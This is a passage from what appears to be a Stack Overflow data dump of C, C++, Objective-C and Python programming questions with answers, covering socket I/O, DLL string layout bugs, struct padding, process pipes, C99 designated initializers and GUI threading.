<li><code>sizeof(char)</code> is guaranteed to be 1 by the C language standard, there's rarely a need to say <code>sizeof(char)</code> when instead your code will be much clearer without it</li>
<li>In the client code, there's no need to use that <code>ioctl</code> to determine how much data can be read without blocking because you're just looping again—your code will spin at 100% CPU while there's no data available.  Just let the <code>read()</code> call block.  If you're running this code on a laptop, your battery will thank you.</li>
<li>Likewise, the client will almost definitely be getting partial reads, you're not going to receive the whole file in a single call.  You need to write out whatever data you get, then loop and receive again.</li>
<li>When you send the image size over the socket at the start, you might get a different value on the client if the two systems are not of the same endianness.  In order to make your code bulletproof, you need to convert the data to network order (big-endian) when sending it, then convert it back to host (native) order after receiving it.  You can use the <a href=""http://linux.die.net/man/3/htonl""><code>ntohl(3)</code> and <code>htonl(3)</code></a> functions to do these conversions for 4-byte values.</li>
</ul>
"
"<p>I am trying to use cryptopp, the below code cause access violation at the stringsource function. What could be the possible cause of this ? I have previously run the similar code with little difference successfully.</p>

<p>AesHelper.cpp</p>

<pre><code>#include ""dll.h""
#include ""AesHelper.h""

#include ""aes.h""
using CryptoPP::AES;
#include ""ccm.h""
using CryptoPP::CBC_Mode;

#include ""filters.h""
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include ""hex.h""
using CryptoPP::HexEncoder;
using CryptoPP::HexDecoder;

#include &lt;string&gt;
using namespace std;

#include ""osrng.h""
using CryptoPP::AutoSeededRandomPool;

byte AesHelper::_key[AES::DEFAULT_KEYLENGTH];
byte AesHelper::_iv[AES::BLOCKSIZE];

void AesHelper::encrypt(const char* str, char ** outIv, char ** encrypted )
{
    try
    {
        AutoSeededRandomPool prng;

        byte key[AES::DEFAULT_KEYLENGTH];
        prng.GenerateBlock(key, sizeof(key));

        byte iv[AES::BLOCKSIZE];
        prng.GenerateBlock(iv, sizeof(iv));

        string cipher, encoded;
        string plain = ""CBC Test Mode"";

        CBC_Mode&lt;AES&gt;::Encryption e;
        e.SetKeyWithIV(key, sizeof(key), iv);

        // The StreamTransformationFilter removes
        //  padding as required.
        StreamTransformationFilter *stf = new StreamTransformationFilter(e,
                new StringSink(cipher),
                CryptoPP::BlockPaddingSchemeDef::ZEROS_PADDING
            );

        StringSource s(plain, true, stf); // This line cause Access Violation

        StreamTransformationFilter filter(e);
        filter.Put((const byte*)plain.data(), plain.size());
        filter.MessageEnd();

        const size_t ret = filter.MaxRetrievable();
        cipher.resize(ret);
        filter.Get((byte*)cipher.data(), cipher.size());

        //encode the cipher to hexadecimal
        StringSource(cipher, true,
        new HexEncoder(
                new StringSink(encoded)
            ) // HexEncoder
        ); // StringSource


        //set the output parameter
        outIv = (char**)_iv;
        encrypted = (char**)cipher.c_str();
    }
    catch(const CryptoPP::Exception&amp; e)
    {
        cerr &lt;&lt; ""exception : "" &lt;&lt; e.what() &lt;&lt; endl;
        exit(1);
    }

}
</code></pre>

<p>Error</p>

<blockquote>
  <p>Unhandled exception at 0x550714CA (cryptopp.dll) in
  PaymentManager.exe: 0xC0000005: Access violation reading location
  0x74736554.</p>
  
  <blockquote>
    <p>cryptopp.dll!memcpy(unsigned char * dst, unsigned char * src, unsigned long count) Line 188 Unknown</p>
  </blockquote>
</blockquote>

<p><strong>UPDATE :</strong> 
Problem solved after making both DLL and Exe program to ""Release"". But now there's new problem.
on this line, the problem also in stringsource function</p>

<pre><code>StringSource(cipher, true,
            new HexEncoder(
                    new StringSink(encoded)
                ) // HexEncoder
            ); // StringSource
</code></pre>

<p>error</p>

<blockquote>
  <p>PaymentManager.exe has triggered a breakpoint.</p>
</blockquote>

<p>The program stop at </p>

<pre><code>void __cdecl _free_base (void * pBlock) {

        int retval = 0;


        if (pBlock == NULL)
            return;

        RTCCALLBACK(_RTC_Free_hook, (pBlock, 0));

        retval = HeapFree(_crtheap, 0, pBlock); // program stop at this line
        if (retval == 0)
        {
            errno = _get_errno_from_oserr(GetLastError());
        } }
</code></pre>
","9530","","<p>0x74736554 is hex for the four ASCII characters <code>""tseT""</code> (big-endian) or <code>""Test""</code> (little-endian)—the latter of which is exactly the bytes at indices 4-7 of your <code>string plain</code>.  The fact that the <code>StringSource</code> constructor is trying to read that address suggests that your executable and the DLL disagree on what a <code>std::string</code> looks like.  In particular, the library is dereferencing the memory address at offset 4 from the object you pass it, but the object you pass it doesn't have a valid pointer value there.</p>

<p>In other words, the <code>string</code> you're passing (or possibly some sub-object of it) looks like this in memory:</p>

<pre><code>Offset    0      1      2      3      4      5      6      7
       +------+------+------+------+------+------+------+------+--
Value  | 0x43 | 0x42 | 0x43 | 0x20 | 0x54 | 0x65 | 0x73 | 0x74 | ...
       | 'C'  | 'B'  | 'C'  | ' '  | 'T'  | 'e'  | 's'  | 't'  | ...
       +------+------+------+------+------+------+------+------+--
</code></pre>

<p>But, the library is treating it like this:</p>

<pre><code>Offset    0      1      2      3      4      5      6      7
       +------+------+------+------+------+------+------+------+--
Value  |           ?????           | Pointer to character data | ...
       +------+------+------+------+------+------+------+------+--
</code></pre>

<p>I figured this all out by just realizing that the address causing the fault consists entirely of ASCII values which match the values from the source code.</p>

<p>The cause of this is almost certainly your code and the library using different <code>std::string</code> implementations, which have different object layouts.  It's exactly the same problem as <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2006/09/15/755966.aspx"" rel=""nofollow"">Allocating and freeing memory across module boundaries</a>.  In order to pass C++ objects between modules (i.e. the main executable and any DLLs it loads), both modules need to agree on how the object is laid out.  If the modules were compiled at different times, then you need to work harder to ensure that they're compiled against the same header files.</p>

<p>If you're compiling the DLL from source, then the easiest thing to do is to make sure that both the DLL and your executable are using the same C++ standard library implementation.  If you're using a DLL that's already been compiled by someone else, then you need to ask them or check the documentation to find the C++ standard library against which it was compiled, and then compile your executable against the same library.</p>

<p>If you can't do that, then the next best solution is to avoid passing C++ objects across module boundaries in <strong>all</strong> cases—use only APIs that take predefined data types (like integers and raw pointers) or data types defined in the DLL's header files.  This will completely avoid the problem, but it will also make your code much harder to write, since you can no longer pass or receive a <code>std::string</code>.</p>
"
"<p>i have an interface where i use to execute the mml command in my solaris unix like below:</p>

<pre><code>&gt; eaw 0004
&lt;RLTYP; 
BSC SYSTEM TYPE DATA

GSYSTYPE
GSM1800

END
&lt;
</code></pre>

<p>As soon as i do <code>eaw &lt;name&gt;</code> on the command line.It will start an interface where in i can execute mml commands and i can see the output of those commands executed.</p>

<p>My idea here is to parse the command output in c++.
I can do away with some logic for parsing.But to start with How can get the command to be executed inside c++ ? Is there any predefined way to do this.
This should be similar to executing sql queries inside c++.But we use other libraries to execute sql queries.I also donot want to run a shell script or create temporary files in between.</p>

<p>what i want is to execute the command inside c++ and get the output and even that in c++.
could anybody give me the right directions?</p>
","9530","","<p>You have several options.  From easiest and simplest to hardest and most complex to use:</p>

<ul>
<li>Use the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/system.html"" rel=""nofollow""><code>system()</code></a> call to spawn a shell to run a command</li>
<li>Use the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/popen.html"" rel=""nofollow""><code>popen()</code></a> call to spawn a subprocess and either write to its standard input stream or read from its standard output stream (but not both)</li>
<li>Use a combination of <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html#"" rel=""nofollow""><code>pipe()</code></a>, <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/fork.html"" rel=""nofollow""><code>fork()</code></a>, <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/dup.html"" rel=""nofollow""><code>dup()</code>/<code>dup2()</code></a>, and <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/exec.html"" rel=""nofollow""><code>exec*()</code></a> to spawn a child process and set up pipes for a child process's standard input and output.</li>
</ul>
"
"<p>So I have a struct that I generally just do sizeof(mystruct) and it would return 0x2C when compiled for x86, but as soon as I switched the compiler over to JUST x86_64 it's telling me the size is 0x30 which makes no sense to me.</p>

<p>Here is the struct:</p>

<pre><code>typedef struct Struct
{
    int32_t unk1;       // 0x0
    int32_t unk2;       // 0x4
    int32_t unk3;       // 0x8
    int32_t unk4;       // 0xC

    int64_t    guid;       // 0x10
    int32_t  entryID;   // 0x18
    int32_t  bytes;     // 0x1C
    int32_t  duration;  // 0x20
    int32_t  expiration;   // 0x24

    int32_t  unk5;      // 0x28
} Struct;
</code></pre>

<p>I then do:</p>

<pre><code>Struct mystruct;
NSLog(@""0x%X"", sizeof(mystruct));
</code></pre>

<p>And it's printing out 0x30, but shouldn't it be 0x2C? I don't see where my problem is</p>

<p>Thanks!</p>
","9530","","<p>It's <a href=""https://www.google.com/search?q=struct+padding+site%3Astackoverflow.com"">structure padding</a> to ensure that arrays of your type are properly aligned for your architecture.  If you have an array:</p>

<pre><code>Struct myarray[2];
</code></pre>

<p>Then each element needs to be 4-byte aligned on x86 but 8-byte aligned on x86-64.  In order to guarantee that, the total structure size must be a multiple of 8 bytes, so the compiler adds extra padding at the end.</p>
"
"<p>I'm trying to write to stdin and read from stdout ( and stderr ) from an external program, without changing the code.</p>

<p>I've tried using named pipes, but stdout doesn't show until the program is terminated and stdin only works on the first input( then cin is null ). </p>

<p>i've tried using /proc/[pid]/fd but that only writes and reads from the terminal and not the program. </p>

<p>i've tried writing a character device file for this and it worked, but only one program at a time ( this needs to work for multiple programs at a time ).</p>

<p>at this point, to my knowledge, I could write the driver that worked to multiplex the io across multiple programs but I don't think that's the ""right"" solution.</p>

<p>the main purpose of this is to view a feed of a program through a web interface. I'm sure there has to be someway to do this. is there anything I haven't tried that's been done before? </p>
","9530","","<p>The typical way of doing this is:</p>

<ol>
<li>Create anonymous pipes (not named pipes) with the <a href=""http://linux.die.net/man/2/pipe""><code>pipe(2)</code></a> system call for the new process's standard streams</li>
<li>Call <a href=""http://linux.die.net/man/2/fork""><code>fork(2)</code></a> to spawn the child process</li>
<li><a href=""http://linux.die.net/man/2/close""><code>close(2)</code></a> the appropriate ends of the pipes in both the parent and the child (e.g. for the stdin pipe, close the read end in the parent and close the write end in the child; vice-versa for the stdout and stderr pipes)</li>
<li>Use <a href=""http://linux.die.net/man/2/dup""><code>dup2(2)</code></a> in the child to copy the pipe file descriptors onto file descriptors 0, 1, and 2, and then <code>close(2)</code> the remaining old descriptors</li>
<li><a href=""http://linux.die.net/man/3/execve""><code>exec(3)</code></a> the external application in the child process</li>
<li>In the parent process, simultaneously write to the child's stdin pipe and read from the child's stdout and stderr pipes.  However, depending on how the child behaves, this can easily lead to deadlock if you're not careful.  One way to avoid deadlock is to spawn separate threads to handle each of the 3 streams; another way is to use the <a href=""http://linux.die.net/man/2/select""><code>select(2)</code></a> system call to wait until one of the streams can be read from/written to without blocking, and then process that stream.</li>
</ol>

<p>Even if you do this all correctly, you may still not see your program's output right away.  This is typically due to buffering stdout.  Normally, when stdout is going to a terminal, it's line-buffered—it gets flushed after every newline gets written.  But when stdout is a pipe (or anything else that's not a terminal, like a file or a socket), it's fully buffered, and it only gets written to when the program has outputted a full buffer's worth of data (e.g. 4 KB).</p>

<p>Many programs have command line options to change their buffering behavior.  For example, <code>grep(1)</code> has the <code>--line-buffered</code> flag to force it to line-buffer its output even when stdout isn't a terminal.  If your external program has such an option, you should probably use it.  If not, it's still possible to change the buffering behavior, but you have to use some sneaky tricks—see <a href=""http://stackoverflow.com/questions/11337041/force-line-buffering-of-stdout-when-piping-to-tee"">this question</a> and <a href=""http://stackoverflow.com/questions/1544050/force-another-programs-standard-output-to-be-unbuffered-using-python"">this question</a> for how to do that.</p>
"
"<p>I am trying to implement a simple client and server in C and I can't find online an example how to set a specific IP address to the client. This is what I got so far:</p>

<pre><code>sockfd = socket(PF_INET, SOCK_STREAM, 0);
if (sockfd == -1)
{
    &lt;some code to handle error&gt;
}
address.sin_family = AF_INET;
address.sin_addr.s_addr = inet_addr(&lt;addressOfTheServer&gt;);
address.sin_port = htons(&lt;portToConnectToServer&gt;);
len = sizeof(address);

int result = connect(sockfd, (struct sockaddr *)&amp;address, len);
</code></pre>

<p>On the server side I check for the client IP Address and I always get 127.0.0.1</p>

<p>I want to change it something different.</p>
","9530","","<p>If you want your client to connect using a specific network interface (say, because you have multiple network cards), then you first need to call <a href=""http://linux.die.net/man/2/bind"" rel=""nofollow""><code>bind(2)</code></a> on that interface's IP address before <code>connect</code>ing.  For example, if you have two network interfaces with IP addresses 192.168.1.100 and 10.101.151.100, then to connect using the 192.168.1.100 address you could do this:</p>

<pre><code>// Error checking omitted for expository purposes
int sockfd = socket(AF_INET, SOCK_STREAM, 0);

// Bind to a specific network interface (and optionally a specific local port)
struct sockaddr_in localaddr;
localaddr.sin_family = AF_INET;
localaddr.sin_addr.s_addr = inet_addr(""192.168.1.100"");
localaddr.sin_port = 0;  // Any local port will do
bind(sockfd, (struct sockaddr *)&amp;localaddr, sizeof(localaddr));

// Connect to the remote server
sock sockaddr_in remoteaddr;
remoteaddr.sin_family = AF_INET;
remoteaddr.sin_addr.s_addr = inet_addr(server_ip);
remoteaddr.sin_port = htons(server_port);
connect(sockfd, (struct sockaddr *)&amp;remoteaddr, sizeof(remoteaddr));
</code></pre>
"
"<p>How can I free this tree effectively? That algorithm should work for any given node in such tree. So I'll have pointer to node, and that node will be ""root"" node. And I want to free everything below that node.
<img src=""http://i.stack.imgur.com/FXE4L.png"" alt=""enter image description here""></p>

<p>Every node in tree is this struct:</p>

<pre><code>  typedef struct tag
  {
      struct tag* parent;
      struct tag* nextSibling;
      struct tag* previousSibling;
      struct tag* firstChild;
      struct tag* lastChild;     
      char* name;
      char* text;     
  }node;
</code></pre>
","9530","","<p>You can use a standard post-order tree traversal algorithms to free the whole tree.  To make it work from any given node, just start by traversing all of the parent links to the root.  For example:</p>

<pre><code>void free_tree(node *n)
{
    // Find the root node of the tree
    while(n-&gt;parent)
        n = n-&gt;parent;

    free_tree_helper(n);
}

void free_tree_helper(node *n)
{
    // Free all children of this node in post-order traversal
    node *child = n-&gt;firstChild;
    while(child)
    {
        // Save the next sibling pointer to avoid dangling pointers
        node *next = child-&gt;nextSibling;
        free_tree_helper(child);
        child = next;
    }

    // All the children have been freed, now free the parent
    free(n-&gt;name);
    free(n-&gt;text);
    free(n);
}
</code></pre>

<p>Alternatively, if you use a <a href=""http://en.wikipedia.org/wiki/Memory_pool"" rel=""nofollow"">memory pool</a> to allocate your tree nodes, all of your nodes come from the same pool, and the pool contains no other tree's nodes, you can instead just free the entire memory pool at once, saving you from having to traverse the entire tree.  This will be much more efficient, since it avoids a lot of cache misses in a potentially large tree, and it also avoids certain memory fragmentation problems.</p>
"
"<p>How to check the version of C++ in Visual C++ Express Edition 2010 and change it to C++11?
I've tried to use uniform initialization like <code>std::vector&lt;std::string&gt; v{""Hello"" , ""World""};</code>, but it doesn't work.</p>
","9530","","<p>You cannot change the C++ language version used by Visual Studio 2010.  It does have partial support for C++11, but since VS 2010 was released before the C++11 standard was finalized, certain features are not exactly in-line with the standard, and furthermore not all features have been implemented.</p>

<p>See <a href=""http://wiki.apache.org/stdcxx/C++0xCompilerSupport"" rel=""nofollow"">this chart</a> for a list of which C++11 features are supported in various major compilers and the versions at which they became available.</p>
"
"<p>I've written a GUI program with PyQt4 that has to send a message string over a serial data link.</p>

<p>I have implemented a GUI interface with two button widgets. I need to send the data over the serial link continuously, once per second when the first button is clicked, and then stop when the second button is clicked.</p>

<p>My current program is able to send data only at the instant a button is clicked. This is the method I wrote to handle the button click signal:</p>

<pre><code>def sendMessage(self):
    while 1:
        print ""Hello........""
        if checke == False:
            break
</code></pre>

<p>Do I need to use threads to solve this problem?</p>
","9530","","<p>Yes, you need to use threads.  In any GUI-based program, any work that's going to take a non-trivial amount of time should always happen on a separate thread to avoid blocking the UI—whenever you see an ""unresponsive"" program, that's almost always due to the program failing to process window messages because its UI thread is blocked inside some long operation.</p>

<p>One easy way to startup a background thread is to use the <a href=""http://docs.python.org/2/library/threading.html"" rel=""nofollow""><code>threading</code> module</a>.  Here's how you might use it to write data to the serial port once per second:</p>

<pre><code>class MyClass:
    # This method will run on a separate thread
    def _serial_port_worker(self):
        while self._run_worker:
            self.send_data_to_serial_port()
            time.sleep(1)

    # Call this to start the worker thread
    def start_worker_thread(self):
        self._run_worker = True
        worker_thread = threading.Thread(target=self._serial_port_worker,
                                         args=(self,))
        worker_thread.start()

    # Call this to tell the worker thread to stop
    def stop_worker_thread(self):
        self._run_worker = False
</code></pre>
"
"<p>I have this occur twice in my code,
I'm not sure why it's complaining
I have a header file ""Scene.h"":</p>

<pre><code>#pragma once

#include &lt;iostream&gt;
#include &lt;string&gt;

#include ""Image.h""
#include ""InteractiveObject.h""

using namespace std;

    class Scene
    {
    public:
        int id;
        string title;
        Image* backgroundImage;
        InteractiveObject interactiveObjects[ 1 ];

        D3DXVECTOR3 pos;

        Scene( int id_, string title_, Image* backgroundImage_ )
            : 
            id( id_ ),
            title( title_ ),
            backgroundImage( backgroundImage_ )
        {
            this-&gt;pos.x = 0.0f;
            this-&gt;pos.y = 0.0f;
            this-&gt;pos.z = 0.0f;
        }
    };
</code></pre>

<p>I have another file called ""InteractiveObject.h"":</p>

<pre><code>#pragma once

#include &lt;iostream&gt;
#include &lt;string&gt;

#include ""Image.h""
enum { CHARACTER, OBJECT };

class InteractiveObject
{
public:
    int id;
    int type;

    float x;
    float y;
    float z;

    D3DXVECTOR3 pos;

    string title;
    Image* theImage;
    InteractiveObject( int id_, string title_, Image* theImage_, int type, float x, float y, float z )
        : 
        id( id_ ),
        title( title_ ),
        theImage( theImage_ )
    {
        this-&gt;pos.x = x;
        this-&gt;pos.y = y;
        this-&gt;pos.z = z;
    }
};
</code></pre>

<p>My intellisense is complaining that there is:</p>

<blockquote>
  <p>Error 1   error C2512: 'InteractiveObject' : no appropriate default
  constructor available c:\users\james\documents\visual studio
  2012\projects\game\game\scene.h   26  1   Game</p>
</blockquote>

<p>Any ideas considering both have default constructors?</p>

<p>EDIT::----------</p>

<p>Okay so thanks to everyone here, I can see that if I do this:;</p>

<pre><code>InteractiveObject( int id_, string title_, Image* theImage_, int type_, float x_, float y_, float z_ )
        : 
        id( id_ ),
        title( title_ ),
        theImage( theImage_ ),
        type( type_ ),
        x( x_ ),
        y( y_ ),
        z( z_ )
    {
</code></pre>

<p>The problem disappears.. I'm not sure this is the best way of doing it and I will no doubt come back crying in a few moments. Can you please vote the answer that delivers what you think is the most concise answer?</p>

<p>My current requirement is to have a Scene contain a certain amount of interactive objects declared on my game constructor and iterated over to draw to the screen:</p>

<p>""game.cpp"":</p>

<pre><code>Game::Game( HWND hWnd, Mouse &amp;mouse  )
    :
    gfx( hWnd ),
    mouse( mouse )
{
    gfx.d3dDevice-&gt;SetRenderState( D3DRS_ALPHABLENDENABLE, TRUE);

    //--------------Scene 0---------------
    scenes[ 0 ] = Scene( 0, ""La barra de funk"", new Image( gfx, ""Images/Scene/Area/Bar/Background.jpg"", 1024, 768, FALSE ) );
    scenes[ 0 ].interactiveObjects[ 0 ] = new InteractiveObject( 0, ""la rockola de muse"", new Image( gfx, ""Images/Scene/Area/Bar/InteractiveObjects/Jukebox.png"", 428, 586, TRUE ), OBJECT, 300.0f, 200.0f, 1.0f );
};

Game::~Game()
{
    // Delete scenes array

    /*for( int a = 0; a &lt; sizeof( scenes ) / sizeof( Scene ); a++ )
    {
        scenes[ a ] = NULL;
        delete scenes[ a ];
    }*/
};

void Game::Go()
{
    gfx.Begin();
    ComposeFrame();
    gfx.End();
    gfx.Present();
};

void Game::ComposeFrame()
{
    for each ( Scene currentScene in scenes )
    {
        currentScene.backgroundImage-&gt;sprite-&gt;Begin( D3DXSPRITE_ALPHABLEND );
        currentScene.backgroundImage-&gt;sprite-&gt;Draw( currentScene.backgroundImage-&gt;gTexture, NULL, NULL, &amp;currentScene.pos, 0xFFFFFFFF );
        currentScene.backgroundImage-&gt;sprite-&gt;End();

        for each ( InteractiveObject currentInteractiveObject in currentScene.interactiveObjects )
        {
            currentInteractiveObject.theImage-&gt;sprite-&gt;Begin( D3DXSPRITE_ALPHABLEND );
            currentInteractiveObject.theImage-&gt;sprite-&gt;Draw( currentScene.backgroundImage-&gt;gTexture, NULL, NULL, &amp;currentInteractiveObject.pos, 0xFFFFFFFF );
            currentInteractiveObject.theImage-&gt;sprite-&gt;End();
        }       
    }
}
</code></pre>
","9530","","<p>Your classes have <em>non-default</em> constructors (that is, constructors which take arguments).  They do not have <em>default</em> constructors, which take zero arguments.</p>

<p>One of the requirements for placing objects into C arrays are that the objects be default constructable.  Otherwise, the compiler has no way to construct them -- when you declare an array, the compiler is required to default-construct all of the instances in the array (there is no way to pass constructor arguments to objects in an array).</p>

<p>To fix this, you either need to make sure you never use those classes in arrays (e.g. you can replace all object arrays by arrays of pointers, if you wish, but then memory management becomes harder).  Alternatively, just add simple default constructors which initialize all of the class members to reasonable values.</p>
"
"<p>I have defined a function as static in my class in this manner (snippet of relevant code)</p>

<pre><code>#ifndef connectivityClass_H
#define connectivityClass_H

class neighborAtt
{
public:
    neighborAtt(); //default constructor
    neighborAtt(int, int, int);

    ~neighborAtt(); //destructor

    static std::string intToStr(int number);

private:
    int neighborID;
    int attribute1;
    int attribute2;

#endif
</code></pre>

<p>and in the .cpp file as</p>

<pre><code>#include ""stdafx.h""
#include ""connectivityClass.h""

static std::string neighborAtt::intToStr(int number)
{
    std::stringstream ss; //create a stringstream
   ss &lt;&lt; number; //add number to the stream
   return ss.str(); //return a string with the contents of the stream
}
</code></pre>

<p>and I get an error (VS C++ 2010) in the .cpp file saying ""A storage class may not be specified here"" and I cannot figure out what I'm doing wrong. </p>

<p>p.s. I've already read <a href=""http://stackoverflow.com/questions/6193506/vs-2010-c-intellisense-a-storage-class-may-not-be-specified-here-even-though"">this</a> which looks like a duplicate but I don't know - as he does - that I am right and the compiler is being finicky. Any help is appreciated, I can't find any information on this!</p>
","9530","","<p>In the definition in the <code>.cpp</code> file, remove the keyword <code>static</code>:</p>

<pre><code>// No static here (it is not allowed)
std::string neighborAtt::intToStr(int number)
{
    ...
}
</code></pre>

<p>As long as you have the <code>static</code> keyword in the header file, the compiler knows it's a static class method, so you should not and cannot specify it in the definition in the source file.</p>

<p>In C++03, the <em>storage class specifiers</em> are the keywords <code>auto</code>, <code>register</code>, <code>static</code>, <code>extern</code>, and <code>mutable</code>, which tell the compiler how the data is stored.  If you see an error message referring to storage class specifiers, you can be sure it's referring to one of those keywords.</p>

<p>In C++11, the <code>auto</code> keyword has a different meaning (it is no longer a storage class specifier).</p>
"
"<p>I'm working with some small (double) numbers in my code, and I need to see all significant digits in the GUI during debug. I can see them fine in the terminal window when manually printing using:</p>

<pre><code>printf(""%*.16e "",value);
</code></pre>

<p>Outputs:</p>

<pre><code>1.1743571567901844e-309
</code></pre>

<p>However, during debug with MS Visual Studio 2008 using the GUI to mouse-over the variable name (or view it in the watchlist), the added #DEN suffix obstructs the view of the least significant bits:</p>

<pre><code>1.174357156790e-309#DEN
</code></pre>

<p>Is there a way to disable that or am I stuck writing printf statements for everything?</p>
","9530","","<p>I'm not certain if this will work, but you can try using one of the <code>e</code>, <code>f</code>, or <code>g</code> <a href=""http://msdn.microsoft.com/en-us/library/75w45ekt%28v=vs.80%29.aspx"" rel=""nofollow"">format specifiers</a> in the Watch or QuickWatch window.  For example, try typing this into a line in the Watch window:</p>

<pre><code>value,f
</code></pre>

<p>This definitely won't work for mousing over variables in the source code, however.</p>
"
"<p>Hello. I am trying to monitor the keys a user presses in a cacao app.</p>

<p>I used this code:</p>

<pre><code> // this code works!
 CGEventMask keyboardMaskKeyDown = CGEventMaskBit(kCGEventKeyDown);

 keyboardEventresult = [NSEvent addGlobalMonitorForEventsMatchingMask:keyboardMaskKeyDown handler:^(NSEvent *keyboardEvent)
 {
      keyboardEventresult = keyboardEvent;
      _currentKeystr = [NSString stringWithFormat:@""%c"",[[keyboardEvent characters]characterAtIndex:0]];
      NSLog(@""Pressed key: %@"",_currentKeystr);
      [hiddentextfield setStringValue:[NSString stringWithFormat:@""%@"",_currentKeystr]];
  }];
</code></pre>

<p>But the problem is that when I change: </p>

<pre><code> addGlobalMonitorForEventsMatchingMask
</code></pre>

<p>to </p>

<pre><code> addLocalMonitorForEventsMatchingMask
</code></pre>

<p>I am getting an error saying<code>Cannot initialize a parameter of type NSEvent *(^)(NSEvent *_strong) with an rvalue of type void(^)(NSEvent *_strong)</code></p>

<p><a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/EventOverview/MonitoringEvents/MonitoringEvents.html"" rel=""nofollow"">Here</a> you can see that apple is doing something similar</p>

<pre><code>         _eventMonitor = [NSEvent addLocalMonitorForEventsMatchingMask:

        (NSLeftMouseDownMask | NSRightMouseDownMask | NSOtherMouseDownMask | NSKeyDownMask)

        handler:^(NSEvent *incomingEvent) 
</code></pre>

<p>Any ideas on how to fix this?</p>
","9530","","<p>The error message is telling you that you're passing the wrong type of parameter.  It's expecting <code>NSEvent *(^)(NSEvent *_strong)</code> (a block taking one argument of type <code>NSEvent*</code> and returning <code>NSEvent*</code>), but you're passing is a <code>void(^)(NSEvent *_strong)</code> (a block taking one argument of type <code>NSEvent*</code> and returning <code>void</code>.  Note the difference in the return types of the blocks—they must match exactly.</p>

<p>To fix this, make your block return an <code>NSEvent*</code>.  According to the <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSEvent_Class/Reference/Reference.html#//apple_ref/occ/clm/NSEvent/addLocalMonitorForEventsMatchingMask%3ahandler%3a"" rel=""nofollow"">documentation</a>, you need to ""return the event unmodified, create and return a new NSEvent object, or return nil to stop the dispatching of the event.""  So add a <code>return &lt;something&gt;;</code> statement to the end of your block, where <code>&lt;something&gt;</code> is the same event, a new event, or <code>nil</code>.</p>
"
"<p>I'm writing a C++ application in visual studio express for windows phone 8.</p>

<p>I'm trying to use flite, a text to speech library written in c, so far I've added its source files and headers, and I've set the option to use precompiled headers to no on all of the individual c files, However the source files still do not compile, instead the compiler complains (many times) :</p>

<pre><code> error C2059: syntax error : '.'
 error C2059: syntax error : '}'
</code></pre>

<p>It complains of these problems for this code in the flite source:</p>

<pre><code>DEF_STATIC_CONST_VAL_STRING(ffeature_default_val,""0"");
</code></pre>

<p>The definition of DEF_STATIC_CONST_VAL_STRING being:</p>

<pre><code>#define DEF_CONST_VAL_STRING(N,S) const cst_val N = {{.a={.type=CST_VAL_TYPE_STRING,.ref_count=-1,.v={.vval= (void *)S}}}}
</code></pre>

<p>Here you can see the ""."" and ""}"" the compiler complains of. I've not modified the c source in anyway, and it builds for iOS and Android projects, so I'd assume I've not grasped how to include C files in visual express.
On a side note, in Visual Express, the icons next to the .c files are ""++"" :/</p>

<p>Any help is greatly appreciated.</p>
","9530","","<p>This syntax:</p>

<pre><code>struct MyStruct someObject = {.foo = bar, .baz = quux};
</code></pre>

<p>is called <em>designated initializers</em>.  It's only valid in the C99 dialect of C—it's invalid in C89 and in all versions of C++.  Microsoft Visual Studio's C compiler is not C99-compliant, so it will not be able to compile that code.  You must either convert the code to use C89 or C++, or use a different compiler which supports C99.</p>
"
"<p>I'm trying to compile bitcoin on my EC2 instance, and I've run into a problem I can't figure out. The build script stops on the following command</p>

<pre><code>g++ -c -Wall -Wextra -Wformat -Wformat-security -Wno-unused-parameter -g   -DMSG_NOSIGNAL=0 -DBOOST_SPIRIT_THREADSAFE -DUSE_UPNP=1 -DUSE_IPV6=1 -I/home/ec2-user/bitcoin/src/leveldb/include -I/home/ec2-user/bitcoin/src/leveldb/helpers -DHAVE_BUILD_INFO -I""/home/ec2-user/bitcoin/src"" -I""/home/ec2-user/bitcoin/src/obj"" -I""/usr/local/include"" -I""/usr/include/openssl"" -MMD -MF obj/alert.d -o obj/alert.o alert.cpp
</code></pre>

<p>by returning the following error(s)</p>

<pre><code>In file included from /usr/include/sys/socket.h:40:0,
                 from compat.h:19,
                 from netbase.h:11,
                 from util.h:27,
                 from alert.h:13,
                 from alert.cpp:11:
/usr/include/bits/socket.h:231:5: error: expected identifier before numeric constant
/usr/include/bits/socket.h:231:5: error: expected ‘}’ before numeric constant
/usr/include/bits/socket.h:231:5: error: expected unqualified-id before numeric constant
In file included from compat.h:19:0,
                 from netbase.h:11,
                 from util.h:27,
                 from alert.h:13,
                 from alert.cpp:11:
/usr/include/sys/socket.h:254:1: error: expected declaration before ‘}’ token
</code></pre>

<p>I've tried compiling with the -std=c++0x option set, but it made no difference. That was the only thing I've been able to come up with.</p>
","9530","","<p>I'd wager that some header file you have is <code>#define</code>ing a macro that interferes with <code>socket.h</code>.  Are you able to compile a program that only includes <code>&lt;sys/socket.h&gt;</code>, with no other inclusions?</p>

<p>The next thing to check is to look at <code>/usr/include/bits/socket.h</code> and see what's on line 231 (where the first error occurs).  If the code looks ok, then the next step is to see what the preprocessed source looks like.  To get the preprocessed output, replace the <code>-c</code> option with <code>-E</code> on the command line, and change the <code>-o obj/alert.o</code> option to <code>-o alert.ii</code> to put the preprocessor output into the file <code>alert.ii</code>.</p>

<p>If you compare the content of <code>alert.ii</code> with <code>/usr/include/bits/socket.h</code>, you can see if it's getting compiled as expected or not.  In particular, if there's a macro which defines something into something unexpected, you'll see code which is clearly wrong at the location the compiler is pointing out.</p>
"
"<p>executor.map()    TypeError: zip argument #2 must support iteration</p>

<p>when I run it ,just generated TypeError: zip argument #2 must support iteration.
can anyone help me fix this problem ?</p>

<pre><code>import time, concurrent.futures
lst100=[i for i in range(100)]

t1=time.clock()
print(list(map(str,lst100)))
t2=time.clock()
print(t2-t1)

t3=time.clock()
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    future_to_url = executor.map(str,lst100, 60)
    print(list(future_to_url))
t4=time.clock()
print(t4-t3)
</code></pre>
